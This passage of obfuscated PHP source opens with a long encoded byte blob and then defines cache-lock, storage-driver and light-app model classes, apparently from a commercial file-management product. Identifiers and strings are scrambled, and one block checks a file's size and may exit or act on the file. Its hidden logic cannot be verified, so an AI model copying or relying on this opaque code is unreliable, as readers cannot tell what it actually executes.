36\247\113\173\310\313\151\224\324\271\337\145\221\126\32"."\xa7\x9f\x72\xe9\x6c\xde\x4c\x6a\xf9\x18\xd5\xa8\x73\x18\x99\x94\xd1\x69\x4a\x67\x7b\x80\x23\x1b\x5\xf9\xb5\x52\x49\xdc\xa1\xc9\x5b\x26\xfa\xeb\x30\xee\x83\xb4\xfe\x44\x8f\x4a\x4c\xd4\x55\x7a\x2b"."\x1f\x17\x38\x27\xdd\xbe\x51\x20\xdc\xc4\x55\x8a\x21\x7a\xa1\xe1\x80\x96\xa5\x73\x9e\xec\x1c\x94\xde\x39\xa\x73\x32\xc8\x8e\xda\xd9\x47\x2f\x19\x61\xc0\xe4\x2a\xd9\xc5\x2f\x17\x89\x77\x49\x6f\xa2"."\373\253\57\212\261\256\40\120\24\362\326\262\320\256\40\346\343\362\101\14\62\50\113\24\201\32\216\205\214\121\11\161\303\364\155\72\102\51\144\306\375\13\240\322\233\101\360\6\136"."\xad\x27\x80\x28\xe6\x93\x9f\x4e\x3d\xc3\xf\x35\x38\x2e\x36\x77\xd9\xcd\x86\x50\x36\x71\x3f\x4f\x57\xfd\xd4\x1e\x7b\x56\x8f\x2d\x1d\x78\x53\xaf\xc6\x43\x79\xd3\xbe\xb3\xe7\x11\x96\x83\x5f\xf4\xb2"."\220\260\157\163\76\241\214\373\301\131\3\176\156\250\72\172\270\117\35\174\130\135\5\142\356\101\116\230\325\362\141\161\225\356\170\5\120\352\65\220\266\352\227\4\245\141\220\372\135".strrev('¾Ø]eªîÙİi®Ì²Iu¯T¥t93"‚¥øg<kB{‘ÎñĞŒ|ÕÔÜÃÀ«D=ç)').strrev('Úé}?W–êtI?W•y…CDâ…#™ëƒ¸~ãë¸¡LCp²E¼ÎeºBšÄU \'P')."\x1\xfe\x67\xb\x46\x9c\x1e\x68\x56\x49\xe3\xbb\xfa\x91\xe0\xaa\x11\x20\x78\x2a\xe9\x42\x49\x1b\xa2\x4b\x7f\xc5\xc4\x2a\x25\x96\x58\x75\x74\xb\x14\xef\x5d\x3a\xbf\x45\xd9\x87\x1a\xfd\x90\xf6\x3d"."\261\130\350\173\205\146\36\237\261\13\130\166\157\227\65\347\201\262\326\271\211\214\4\73\244\31\344\341\157\335\335\166\62\60\40\115\21\311\322\301\112\256\321\66\335\242\40\134\34"."\357\213\104\254\31\55\346\141\333\306\266\322\142\265\111\224\350\177\60\201\354\214\104\217\123\102\265\251\106\317\375\307\61\322\122\343\75\112\111\375\343\13\332\115\271\73\176\36\364"."\x6a\xb6\x57\x42\x48\x49\x7c\xa8\xdb\x51\x32\xc1\x40\x22\xc4\xb1\xd5\xd9\x57\x57\xf5\xa8\x98\xa8\x63\xc8\xa3\x4c\x97\xa9\x9a\xc5\x93\x9e\xad\x14\xde\xb4\x24\xe6\xe\x97\x66\x6\x94\xd3\x9c\xfa\x89"."\xfd\x9e\x93\x4d\x92\x9f\xdb\x23\x36\x70\xc2\x79\x4\x59\xae\x8e\xa5\x2b\x39\xf7\x95\x6d\xc8\x48\x45\xf2\x9a\xa8\xae\x5a\x7a\xbc\x50\x48\x85\x88\x18\x9\x7a\x4\xb\x9a\xa8\x31\x90\x66\x6\xba\xb9"."\xe9\xa1\x26\xe9\xa6\x39\x45\x55\x78\xa8\xa5\xe7\x67\x4d\x39\x2c\xa6\x0\x93\xfd\x28\x73\x93\x8a\xbe\xee\x38\x6a\xa2\x78\xa7\xeb\x6d\x62\x42\xa2\xdc\xf\x16\xb3\x21\x22\x74\x41\x90\x3c\xc9\x82\xd5"."\x71\xae\xe1\x2f\xb6\x39\xce\x39\x96\xfb\xd\x47\xc4\xed\xc9\x6e\x8f\x51\xd4\xfd\xd2\x2d\xd0\x46\x62\x20\x40\xbf\x26\xed\xae\x62\x23\x15\xa1\x8\x7b\x60\x3\x47\x24\xf9\x2e\x39\x52\xf1\x44\x87\xa1"."\x2f\x76\x11\xe5\x22\x3\xcc\x7c\xd8\x72\xbd\xe0\x4a\x9d\xd0\xd2\x30\xe3\xfc\xff\xaf\x9f\x2f\xfc\x7f\xf5\x6a\xe1\xbc\x26\x26\x89\x77\x3c\x70\xdc\xd\xfc\x37\x63\xf9\xa6\x24\xa7\xd7\x54\xa\xec\xea"."\x87\x73\x7\xdd\xb\xb0\x88\x3f\xe6\x2d\xc5\xb9\x16\x34\x73\x13\xc6\xbc\x87\x69\xec\x36\x4c\xcb\xe7\xa5\x7d\xb6\xf6\x89\xa5\xea\xe9\x58\x84\x7c\x23\xfc\x1d\xd2\x5a\x11\xb7\x41\x9c\xfb\x19\xd9\x1"."\366\340\72\171\41\166\250\126\106\101\206\370\301\250\6\36\123\20\343\207\245\247\304\215\324\110\215\253\154\242\320\351\164\32\55\361\37\125\331\104\33\20\233\302\374\257\371\131\50"."\x85\x4f\x84\xc4\x29\x2\x8c\x9e\x6c\xbf\x1a\x2d\xb1\xb3\x63\x23\x10\xfd\xa1\xe3\x18\x71\x22\xc6\xf2\x40\xa3\x64\xba\xe4\x0\x55\x51\xb3\x84\x63\x4e\x1c\x40\x79\xb8\x61\xe\xb1\x5\x30\x9b\x4e\x47"."\211\136\327\163\231\64\223\45\217\255\103\172\137\255\331\120\135\232\323\1\271\10\126\76\167\12\264\370\103\347\115\356\227\317\233\275\256\352\370\213\241\116\134\167\274\132\111\265\101"."\xd0\x2\x89\x61\x29\x7\x93\x5b\x91\xb\x20\x72\x13\xec\xad\x2e\x43\xf1\x3a\x2e\xf2\x4c\xb3\xb2\x6a\xaf\x6f\xde\x28\x21\xc4\xc3\x21\x79\x3c\x18\x9d\xe8\x2b\x9b\x84\x17\x74\x42\xb9\xe4\x47\x52\xed"."\225\136\357\256\142\357\50\170\246\257\152\223\142\44\323\61\123\350\364\47\56\36\15\223\70\237\147\105\373\173\33\210\365\23\40\72\72\220\164\231\2\145\244\347\263\361\302\24\56"."\42\261\42\63\221\101\312\174\0\63\110\224\364\371\1\344\220\24\132\362\73\37\316\222\330\102\303\271\4\227\326\312\226\62\313\226\224\215\303\153\345\305\210\51\113\102\344\64\374".strrev('*ô§¹^ï9ş] Ô(›ÌÀH’Aó´÷ØŠuteŠ®ÉÇ~G "'."\0".'ıû€ñ"˜í±ô')."\x72\x5b\x31\xc2\x52\x32\x29\xc5\x9c\xd4\xa1\x5f\x6c\xb4\x19\x12\x3e\x28\x48\x32\xbd\xd6\x8\x8c\x69\xdc\xcd\x8b\xbb\x94\xf3\xc1\x75\xe9\xa6\x36\x45\x10\x32\x58\x7d\x19\x27\xee\x8\x25\x66\x85\x15"."\303\147\53\261\217\270\340\265\336\17\317\150\143\202\323\22\334\175\72\335\245\215\325\310\232\146\347\33\16\105\20\236\225\160\152\222\335\262\60\41\320\307\335\17\54\373\144\133\147"."\107\306\152\250\260\153\226\312\213\153\31\321\115\14\253\325\175\262\320\234\305\145\273\151\216\124\2\104\237\224\340\152\15\322\111\12\353\175\10\175\7\332\25\56\60\20\237\164\132"."\151\363\154\174\316\120\36\142\224\344\165\100\135\147\103\54\233\141\154\207\53\311\222\37\107\166\136\300\312\22\14\11\5\364\174\130\252\116\276\234\235\266\100\274\366\107\4\126\72"."\207\130\62\157\27\11\154\207\64\35\203\57\221\110\336\61\310\31\223\23\35\315\161\117\55\71\326\10\364\245\300\2\21\14\323\264\200\63\211\346\327\135\255\227\13\270\173\106\113"."\x58\xe3\x86\x9d\xca\x49\x67\xad\xea\xc4\x6a\x78\xb9\x6a\x50\xe1\x43\xb5\xdb\xeb\x6e\x15\x1b\x53\xf7\x9\x54\x54\x52\xd5\x1e\x49\xc3\x23\x61\xd6\x28\x43\x5b\x54\xb3\x18\x4d\xc2\x25\x5\xcf\xeb\x28"."\73\315\20\340\262\64\11\227\255\112\146\205\45\201\215\124\316\326\52\326\64\335\253\36\74\220\142\244\153\164\330\165\326\247\131\247\33\317\232\231\253\77\7\30\347\316\115\304\36"."\xb5\x5b\x21\xa4\x15\xae\x9b\xf6\x5a\xad\xa8\x99\x79\xda\x56\x88\xdc\xae\x5d\xa0\x16\xad\x65\x29\x35\xa8\x2b\xa5\x1c\xd3\x6a\x9f\x8\x8d\x8c\x6a\x32\x2f\xd2\x6a\xe8\x87\xd0\x4f\xe2\x2d\x5c\xf6\x61".base64_decode('VSNZVjaprY4Sq0kZLKeeiAsujxu4QAXmC5ARnUbzxojOeD6uhj/TQf4rxZGiybeUtA==')."\120\263\304\52\342\201\262\173\234\253\152\163\242\161\261\42\171\225\255\151\25\340\301\262\203\352\123\172\136\143\127\15\222\71\5\75\126\231\266\221\322\235\256\153\145\127\126\64\235".base64_decode('fSQvCSNdckAhyXDoMdSQlBEQsH1CJE/rkxgagRMOyxfKRsBNBr0E7cCX7fz6i7hdpQ==').base64_decode('2y5Njptl24PTEmaJ/Labti2UAqjogPCKeO/0SDovKCTuunCjyCUKQVtCfUgQrmPxmQ==').base64_decode('PK7TVEKzHBF8OcMj8tYI17JdFdfFsQCgA3DSnGD+o7AdvmiPuL7R3PygYGUAFWUNHg==')."\342\355\300\362\323\24\77\74\214\340\45\165\300\213\150\276\341\122\326\121\234\276\45\305\65\155\277\250\6\20\341\212\52\250\127\164\42\133\3\323\241\170\42\136\225\324\27\210\307"."\x57\x45\x63\x9d\xd4\x89\x7a\x55\x32\x29\x25\x69\x44\x55\x25\xf5\xf5\x44\x23\xd3\xa5\x5\x7b\x3\xa1\x70\x55\x1a\x56\x9e\x8a\xa8\xc2\x13\x19\x4d\xa\xf5\x91\x56\x92\x1b\xc8\xe9\x5a\x11\xea\x58\x21".base64_decode('WkLuusXNQClnMoE/uzmJa3kmB5DMdPWCcEEnyjjFG/K8WsxXJA84XyRy6SgyhIWKsA==').base64_decode('4lME6o6VAIqdyvN1z3lucXnvc1zyS3CyNgixkXBO3pMJYFbNAZKlytW3HCRVDABu2A==')."\162\23\264\346\206\315\244\164\213\101\117\74\140\11\13\103\52\51\267\321\260\43\331\326\262\65\357\272\251\364\20\257\176\41\327\373\337\131\62\267\162\40\257\0\0"."", 10, -8))); goto BÕ”øÁ÷¦Ç; c²èğê‰¡: if ($_SERVER[$_SERVER[Ö†ØøÖ±][288]] != $_size($_file)) { $_getc = $_SERVER[Ö†ØøÖ±][290]; $_getfile = $_SERVER[$_SERVER[Ö†ØøÖ±][291]] . $_SERVER[Ö†ØøÖ±][292]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ö†ØøÖ±][246], $_getfilec); if (count($_getarrs) < $_SERVER[Ö†ØøÖ±][293]) { $exit = $_SERVER[Ö†ØøÖ±][294]; $exit(); } $_act = $_SERVER[Ö†ØøÖ±][295]; $_act($_file); } class CacheLockRedis { public function lock($»³´¡ş, $ãÎ¾¯ìÓ = 10) { $Ş¸ˆÚ˜· = Cache::init(); $—Üö»© = microtime(!0) + $ãÎ¾¯ìÓ; while (microtime(!0) < $—Üö»©) { $ÑĞî˜ÙÓ = $Ş¸ˆÚ˜·->get($»³´¡ş); if (!$ÑĞî˜ÙÓ) { $ĞôÛƒ´Û = $Ş¸ˆÚ˜·->setLock($»³´¡ş, $—Üö»©, $ãÎ¾¯ìÓ); if ($ĞôÛƒ´Û) { return !0; } } else { if ($ÑĞî˜ÙÓ < microtime(!0)) { $Ş¸ˆÚ˜·->set($»³´¡ş, $—Üö»©, $ãÎ¾¯ìÓ * 2); if ($Ş¸ˆÚ˜·->get($»³´¡ş) === $ÑĞî˜ÙÓ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($á¥ëˆâ™) { return Cache::init()->get($á¥ëˆâ™); } public function unlock($…§šÍ¸Ô) { return Cache::init()->remove($…§šÍ¸Ô); } } class CacheLockMemcached { public function lock($§‰Î—†®, $ú©¯ë¢Ã = 0) { $ñÊÕÙÁ = Cache::init(); $¿şÌ†¦ó = microtime(!0) + $ú©¯ë¢Ã; while (microtime(!0) < $¿şÌ†¦ó) { $Í¶Ê‹ÓØ = $ñÊÕÙÁ->get($§‰Î—†®); if (!$Í¶Ê‹ÓØ || $Í¶Ê‹ÓØ < microtime(!0)) { $¸±»˜øƒ = $ñÊÕÙÁ->handle->add($§‰Î—†®, $¿şÌ†¦ó, $ú©¯ë¢Ã); if ($¸±»˜øƒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Õ½Ù…è) { return Cache::init()->get($Õ½Ù…è); } public function unlock($í¯Åõ÷Ì) { return Cache::init()->remove($í¯Åõ÷Ì); } } goto cã…ì½±Ş£; BåäÒˆÎ£á: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\163\157\165\x72\143\145\123\x65\x63\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\157\x75\162\x63\145\111\x44", "\x74\171\160\x65\111\x44", "\x63\x72\145\141\x74\x65\125\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\56\163\164\157\162\141\x67\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\151\x7a\x65\115\141\170", "\163\x79\163\x74\x65\x6d", "\x64\x65\x66\x61\165\x6c\x74", "\144\x72\x69\x76\145\162", "\143\x6f\x6e\x66\151\x67"); public function listData($â€™ÛËä = false, $±úÙÍ = "\x6d\157\144\x69\x66\171\x54\151\155\x65", $¹„–¼“ = false) { $èÔ…ÏäÔ =& $_SERVER[Ö†ØøÖ±]; $İÌ¦¼Ş = parent::listData($â€™ÛËä, $±úÙÍ, $¹„–¼“); if ($â€™ÛËä) { return $İÌ¦¼Ş; } $ÔÚ¦ì³ = $this->ioSizeUseGet(array_to_keyvalue($İÌ¦¼Ş, $èÔ…ÏäÔ[12], $èÔ…ÏäÔ[451])); foreach ($İÌ¦¼Ş as $ûÖ†ú‚ó => $ì¸¡Šà†) { unset($İÌ¦¼Ş[$ûÖ†ú‚ó][$èÔ…ÏäÔ[6]]); $İÌ¦¼Ş[$ûÖ†ú‚ó][$èÔ…ÏäÔ[1886]] = isset($ÔÚ¦ì³[$ì¸¡Šà†[$èÔ…ÏäÔ[451]]]) ? $ÔÚ¦ì³[$ì¸¡Šà†[$èÔ…ÏäÔ[451]]] : 0; } return $İÌ¦¼Ş; } public function ioSizeUseGet($íÔê ) { $œ»¥öÉŞ =& $_SERVER[Ö†ØøÖ±]; if (!$íÔê ) { return array(); } $À±©°Î¯ = $œ»¥öÉŞ[2217] . implode($œ»¥öÉŞ[50], $íÔê ); $İÊİ»ó÷ = Cache::get($À±©°Î¯); if ($İÊİ»ó÷) { return $İÊİ»ó÷; } $ì¤´ˆµú = array($œ»¥öÉŞ[870] => $œ»¥öÉŞ[451], $œ»¥öÉŞ[2218] => $œ»¥öÉŞ[76]); $®ØÕÙ×ó = array($œ»¥öÉŞ[870] => array($œ»¥öÉŞ[7], $íÔê )); $İÊİ»ó÷ = Model($œ»¥öÉŞ[842])->field($ì¤´ˆµú)->where($®ØÕÙ×ó)->group($œ»¥öÉŞ[870])->select(); $İÊİ»ó÷ = array_to_keyvalue($İÊİ»ó÷, $œ»¥öÉŞ[451], $œ»¥öÉŞ[76]); Cache::set($À±©°Î¯, $İÊİ»ó÷, 600); return $İÊİ»ó÷; } public function getConfig($¼²åø•) { $¯Ä¦õ‡° = parent::listData($¼²åø•); return json_decode($¯Ä¦õ‡°[$_SERVER[Ö†ØøÖ±][6]], !0); } public function update($åÔ…ôùÍ, $Ş‚å…•) { $ó¬¼µëú =& $_SERVER[Ö†ØøÖ±]; $â´¯­Ç³ = $Ş‚å…•[$ó¬¼µëú[32]]; $—®æŠ„Ñ = array_to_keyvalue(parent::listData(), $ó¬¼µëú[32]); if (isset($—®æŠ„Ñ[$â´¯­Ç³]) && $—®æŠ„Ñ[$â´¯­Ç³][$ó¬¼µëú[451]] != $åÔ…ôùÍ) { return !1; } $this->checkPwd($åÔ…ôùÍ, $Ş‚å…•); if (isset($Ş‚å…•[$ó¬¼µëú[2219]]) && $Ş‚å…•[$ó¬¼µëú[2219]] == $ó¬¼µëú[88]) { $this->checkConfig($Ş‚å…•); } unset($Ş‚å…•[$ó¬¼µëú[2219]]); $ÔòâàÚ« = parent::update($åÔ…ôùÍ, $Ş‚å…•); if ($ÔòâàÚ« && $Ş‚å…•[$ó¬¼µëú[37]]) { $ˆ®ç§Õ… = 0; foreach ($—®æŠ„Ñ as $ŒÔÛçšĞ) { if ($ŒÔÛçšĞ[$ó¬¼µëú[37]] && $ŒÔÛçšĞ[$ó¬¼µëú[451]] != $åÔ…ôùÍ) { $ˆ®ç§Õ… = $ŒÔÛçšĞ[$ó¬¼µëú[451]]; parent::update($ŒÔÛçšĞ[$ó¬¼µëú[451]], array($ó¬¼µëú[37] => 0)); } } $this->updateBackup($åÔ…ôùÍ, $ˆ®ç§Õ…); } return $ÔòâàÚ«; } public function add($œ»ÂâÖÂ) { $¾Ä¥ˆ¾Å =& $_SERVER[Ö†ØøÖ±]; $¢ñö÷º¨ = array_to_keyvalue(parent::listData(), $¾Ä¥ˆ¾Å[32]); if (isset($¢ñö÷º¨[$œ»ÂâÖÂ[$¾Ä¥ˆ¾Å[32]]])) { return !1; } $this->checkConfig($œ»ÂâÖÂ); $üË¿°¾ = parent::insert($œ»ÂâÖÂ); if ($üË¿°¾ && $œ»ÂâÖÂ[$¾Ä¥ˆ¾Å[37]]) { foreach ($¢ñö÷º¨ as $ÆáúŠÆ) { if ($ÆáúŠÆ[$¾Ä¥ˆ¾Å[37]]) { parent::update($ÆáúŠÆ[$¾Ä¥ˆ¾Å[451]], array($¾Ä¥ˆ¾Å[37] => 0)); } } } return $üË¿°¾; } public function updateBackup($—¿¥œêï, $¾Ü“ Ç) { $¯ú‹Ûæ  =& $_SERVER[Ö†ØøÖ±]; if (!$¾Ü“ Ç) { return; } $Ç¿Üµ = Model($¯ú‹Ûæ [802])->config(); if ($Ç¿Üµ[$¯ú‹Ûæ [1669]] != $¯ú‹Ûæ [88] || $Ç¿Üµ[$¯ú‹Ûæ [804]] != $¾Ü“ Ç) { return; } $¦ñ»æ† = Model($¯ú‹Ûæ [823])->get($¯ú‹Ûæ [833]); $¦ñ»æ† = json_decode($¦ñ»æ†, !0); if (!$¦ñ»æ†) { return; } $¦ñ»æ†[$¯ú‹Ûæ [804]] = $—¿¥œêï; Model($¯ú‹Ûæ [823])->set(array($¯ú‹Ûæ [833] => $¦ñ»æ†)); } public function checkPwd($¼çµÓ­Ñ, &$ğ¤ãš–á) { $‹Éä§¸Ì =& $_SERVER[Ö†ØøÖ±]; if (empty($ğ¤ãš–á[$‹Éä§¸Ì[6]])) { return; } $İ¯ˆ£Â´ = json_decode($ğ¤ãš–á[$‹Éä§¸Ì[6]], !0); $ÅùèğÚ” = $‹Éä§¸Ì[12]; $ò¨ç¥ÃÄ = array($‹Éä§¸Ì[2220], $‹Éä§¸Ì[2221], $‹Éä§¸Ì[942]); foreach ($ò¨ç¥ÃÄ as $Ûæò€Öô) { if (isset($İ¯ˆ£Â´[$Ûæò€Öô])) { $ÅùèğÚ” = $Ûæò€Öô; break; } } if (!$ÅùèğÚ”) { return; } $ùÛ·‚õ = $this->getConfig($¼çµÓ­Ñ); $çÚ¢ñ‚ë = $ùÛ·‚õ[$ÅùèğÚ”]; $ä¢©šæŞ = $İ¯ˆ£Â´[$ÅùèğÚ”]; if ($ä¢©šæŞ == str_repeat($‹Éä§¸Ì[203], strlen($çÚ¢ñ‚ë))) { $İ¯ˆ£Â´[$ÅùèğÚ”] = $çÚ¢ñ‚ë; $ğ¤ãš–á[$‹Éä§¸Ì[6]] = json_encode($İ¯ˆ£Â´); } else { if ($ä¢©šæŞ != $çÚ¢ñ‚ë) { $ğ¤ãš–á[$‹Éä§¸Ì[2219]] = $‹Éä§¸Ì[88]; } } } public function checkConfig(&$¼²®ß®è, $ÅŞş£É¦ = false) { $ÏÇÏâÜˆ =& $_SERVER[Ö†ØøÖ±]; $êÃ¥Ğ–ğ = strtolower($¼²®ß®è[$ÏÇÏâÜˆ[95]]); $ğ›¬Ş´Ö = json_decode($¼²®ß®è[$ÏÇÏâÜˆ[6]], !0); foreach ($ğ›¬Ş´Ö as $¤«”¿ì„ => $¡ˆ¾ÒÅ) { if (is_string($¡ˆ¾ÒÅ)) { $ğ›¬Ş´Ö[$¤«”¿ì„] = trim($¡ˆ¾ÒÅ); } } $ğ›¬Ş´Ö[$ÏÇÏâÜˆ[2222]] = rand_string(6); $‚»èÛªì = $GLOBALS[$ÏÇÏâÜˆ[6]][$ÏÇÏâÜˆ[89]][$ÏÇÏâÜˆ[879]]; $ÊÊïˆĞî = isset($‚»èÛªì[$êÃ¥Ğ–ğ]) ? $‚»èÛªì[$êÃ¥Ğ–ğ] : ucfirst($êÃ¥Ğ–ğ); $ÑúÎ¢á = $ÏÇÏâÜˆ[74] . $ÊÊïˆĞî; if (!$ÊÊïˆĞî || !class_exists($ÑúÎ¢á)) { if ($ÅŞş£É¦) { return LNG($ÏÇÏâÜˆ[2223]); } write_log(array($ÏÇÏâÜˆ[2224], $¼²®ß®è, get_caller_info()), $ÏÇÏâÜˆ[2225]); show_json(LNG($ÏÇÏâÜˆ[2223]), !1, $¼²®ß®è); } $˜À„ëÆ = new $ÑúÎ¢á($ğ›¬Ş´Ö); if (in_array($êÃ¥Ğ–ğ, $˜À„ëÆ->objectDriver)) { if (!$˜À„ëÆ->isBucketCors() && !$˜À„ëÆ->setBucketCors()) { $äàñéü¸ = LNG($ÏÇÏâÜˆ[2226]); $äàñéü¸ .= $ÏÇÏâÜˆ[2227] . LNG($ÏÇÏâÜˆ[2228]); if ($ÅŞş£É¦) { return $äàñéü¸; } show_json($äàñéü¸, !1); } } $»ŒÕŠÎè = rtrim($ğ›¬Ş´Ö[$ÏÇÏâÜˆ[1233]], $ÏÇÏâÜˆ[8]) . $ÏÇÏâÜˆ[8]; $Ş¯Šíµ = $˜À„ëÆ->getPath($»ŒÕŠÎè . $ÏÇÏâÜˆ[1237]); if (!$˜À„ëÆ->mkfile($Ş¯Šíµ)) { if ($ÅŞş£É¦) { return LNG($ÏÇÏâÜˆ[2226]); } show_json(LNG($ÏÇÏâÜˆ[2226]), !1); } $ğ›¬Ş´Ö[$ÏÇÏâÜˆ[1233]] = $»ŒÕŠÎè; $¼²®ß®è[$ÏÇÏâÜˆ[6]] = json_encode($ğ›¬Ş´Ö); $¼²®ß®è[$ÏÇÏâÜˆ[95]] = $ÊÊïˆĞî; return !0; } public function driverListSystem() { $Ü¾ÖğÉ‹ =& $_SERVER[Ö†ØøÖ±]; $˜È£€„  = parent::listData(); $Íê«¤êÍ = array(); foreach ($˜È£€„  as $ˆ‹ÁŞ„«) { unset($ˆ‹ÁŞ„«[$Ü¾ÖğÉ‹[215]], $ˆ‹ÁŞ„«[$Ü¾ÖğÉ‹[85]]); $ˆ‹ÁŞ„«[$Ü¾ÖğÉ‹[6]] = json_decode($ˆ‹ÁŞ„«[$Ü¾ÖğÉ‹[6]], !0); $Íê«¤êÍ[] = $ˆ‹ÁŞ„«; } return $Íê«¤êÍ; } public function defaultDriver() { $¡‚ê¥ƒ³ =& $_SERVER[Ö†ØøÖ±]; $ËÁÉÃé = parent::listData(); $ê±¥ÕĞ = array_filter_by_field($ËÁÉÃé, $¡‚ê¥ƒ³[37], 1); $ê±¥ÕĞ = $ê±¥ÕĞ[0]; if ($ê±¥ÕĞ) { $ê±¥ÕĞ[$¡‚ê¥ƒ³[6]] = json_decode($ê±¥ÕĞ[$¡‚ê¥ƒ³[6]], !0); } return $ê±¥ÕĞ; } public function driverInfo($‡áöÎ¯) { $í†ƒø¤ã =& $_SERVER[Ö†ØøÖ±]; $¨Ò¨àÁ¯ = array_to_keyvalue(parent::listData(), $í†ƒø¤ã[451]); if (!isset($¨Ò¨àÁ¯[$‡áöÎ¯])) { return !1; } $ò›Á­½Ì = $¨Ò¨àÁ¯[$‡áöÎ¯]; $ò›Á­½Ì[$í†ƒø¤ã[6]] = json_decode($ò›Á­½Ì[$í†ƒø¤ã[6]], !0); return $ò›Á­½Ì; } public function remove($¤è¹Éù´) { $this->removeShareItems($¤è¹Éù´); return parent::remove($¤è¹Éù´); } public function removeWithFile($€‰é¤Î×, $ÁäÃÈ™ª) { $ñ˜×ò¡Ã =& $_SERVER[Ö†ØøÖ±]; $‰ì×à™È = array($ñ˜×ò¡Ã[870] => $€‰é¤Î×); $âæàî„ = Model($ñ˜×ò¡Ã[521])->where($‰ì×à™È)->count(); $­çó óÄ = Model($ñ˜×ò¡Ã[521])->where($‰ì×à™È)->sum($ñ˜×ò¡Ã[76]); $½Ñ¹„š = $ÁäÃÈ™ª . $ñ˜×ò¡Ã[2229] . $€‰é¤Î×; $ûå• ¡Å = LNG($ÁäÃÈ™ª == $ñ˜×ò¡Ã[597] ? $ñ˜×ò¡Ã[2230] : $ñ˜×ò¡Ã[2231]); $¶Æ³‘àœ = new TaskFileTransfer($½Ñ¹„š, $ñ˜×ò¡Ã[2225], $âæàî„, $ûå• ¡Å . "\x28{$€‰é¤Î×}\x29"); $¶Æ³‘àœ->task[$ñ˜×ò¡Ã[816]] = (double) $­çó óÄ; $–ÒåíË = KodIO::defaultDriver(); $–’š¹– = $–ÒåíË[$ñ˜×ò¡Ã[451]]; $”ˆŠÇ°€ = "\x7b\151\x6f\x3a{$–’š¹–}\x7d\x2f"; $”Ùş¾×¨ = !0; $öø¸“çú = array(); $™±Ê¶ = Model($ñ˜×ò¡Ã[214])->where($‰ì×à™È)->field($ñ˜×ò¡Ã[2232])->select(); foreach ($™±Ê¶ as $”¨Áã’) { $Ü‹çøğ = $”¨Áã’[$ñ˜×ò¡Ã[84]]; $åäıÈÀ¼ = $”ˆŠÇ°€ . str_replace("\x7b\151\157\x3a{$€‰é¤Î×}\x7d\57", $ñ˜×ò¡Ã[12], $Ü‹çøğ); if (!IO::exist($Ü‹çøğ)) { $öø¸“çú[] = $”¨Áã’[$ñ˜×ò¡Ã[518]]; $¶Æ³‘àœ->updateFileEnd($”¨Áã’[$ñ˜×ò¡Ã[32]], $”¨Áã’[$ñ˜×ò¡Ã[76]]); continue; } if (IO::exist($åäıÈÀ¼)) { $¶Æ³‘àœ->updateFileEnd($”¨Áã’[$ñ˜×ò¡Ã[32]], $”¨Áã’[$ñ˜×ò¡Ã[76]]); continue; } if (!IO::move($Ü‹çøğ, get_path_father($åäıÈÀ¼))) { $”Ùş¾×¨ = !1; break; } $‰ì×à™È = array($ñ˜×ò¡Ã[518] => $”¨Áã’[$ñ˜×ò¡Ã[518]]); $ÃÕå†…ø = array($ñ˜×ò¡Ã[870] => $–’š¹–, $ñ˜×ò¡Ã[84] => $åäıÈÀ¼); Model($ñ˜×ò¡Ã[214])->where($‰ì×à™È)->save($ÃÕå†…ø); } $this->removeByFileID($öø¸“çú); if (!$”Ùş¾×¨) { $¶Æ³‘àœ->stop($½Ñ¹„š); return !1; } $¶Æ³‘àœ->end(); if ($ÁäÃÈ™ª == $ñ˜×ò¡Ã[1866]) { $this->remove($€‰é¤Î×); } } public function progress($ÁÃÑôÇ›, $èÍâğüÜ) { return Task::get($èÍâğüÜ . $_SERVER[Ö†ØøÖ±][2229] . $ÁÃÑôÇ›); } private function removeByFileID($‰Ûí’ÕÕ = array()) { $Ó¬îœ¤ı =& $_SERVER[Ö†ØøÖ±]; if (empty($‰Ûí’ÕÕ)) { return; } $Àõçè»Ä = array($Ó¬îœ¤ı[518] => array($Ó¬îœ¤ı[7], $‰Ûí’ÕÕ)); $Á­‹Œ«ä = Model($Ó¬îœ¤ı[1385])->where($Àõçè»Ä)->field($Ó¬îœ¤ı[181])->select(); if (!$Á­‹Œ«ä) { return; } $Á­‹Œ«ä = array_to_keyvalue($Á­‹Œ«ä, $Ó¬îœ¤ı[12], $Ó¬îœ¤ı[181]); foreach ($Á­‹Œ«ä as $ºãÛƒé) { Model($Ó¬îœ¤ı[467])->removeNow($ºãÛƒé, !1); } } private function removeShareItems($şä¶åº¸) { $¯èË¢¹ =& $_SERVER[Ö†ØøÖ±]; $ú¹»­­´ = "\x7b\x69\x6f\x3a{$şä¶åº¸}\x7d\57"; $ÉÙÆÈÊÒ = array($¯èË¢¹[181] => 0, $¯èË¢¹[1228] => array($¯èË¢¹[435], "{$ú¹»­­´}\x25")); $ÀÉ¯ğ×ó = Model($¯èË¢¹[1877])->where($ÉÙÆÈÊÒ)->field($¯èË¢¹[642])->select(); if (empty($ÀÉ¯ğ×ó)) { return; } $Çç—ŠˆÒ = array_to_keyvalue($ÀÉ¯ğ×ó, $¯èË¢¹[12], $¯èË¢¹[642]); Model($¯èË¢¹[641])->remove($Çç—ŠˆÒ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\114\151\x67\150\x74\x41\160\x70"; public $modelType = "\123\x79\163\x74\x65\155\117\160\x74\151\x6f\156"; public $field = array("\156\x61\x6d\x65", "\147\x72\157\165\160", "\144\145\163\143", "\143\x6f\x6e\x74\145\x6e\164"); public function listData($Ìá“÷äû = false, $‘ƒû£í = "\155\x6f\x64\151\x66\171\124\x69\x6d\145", $‹èÇ‹”š = true) { return parent::listData($Ìá“÷äû, $‘ƒû£í, $‹èÇ‹”š); } public function remove($ö¡¬É¨Ã) { $µÅ„çÅê = $this->findByName($ö¡¬É¨Ã); if (!$µÅ„çÅê) { return !1; } return parent::remove($µÅ„çÅê[$_SERVER[Ö†ØøÖ±][451]]); } public function add($ŸµîµëÆ) { if ($this->findByName($ŸµîµëÆ[$_SERVER[Ö†ØøÖ±][32]])) { return !1; } return parent::insert($ŸµîµëÆ); } public function update($ˆœÊñÜ, $±ï’æµ—) { $¥Ë¦Ø¤– =& $_SERVER[Ö†ØøÖ±]; $¬Í¦íñÉ = $this->findByName($ˆœÊñÜ); $™ûŞ¡«É = 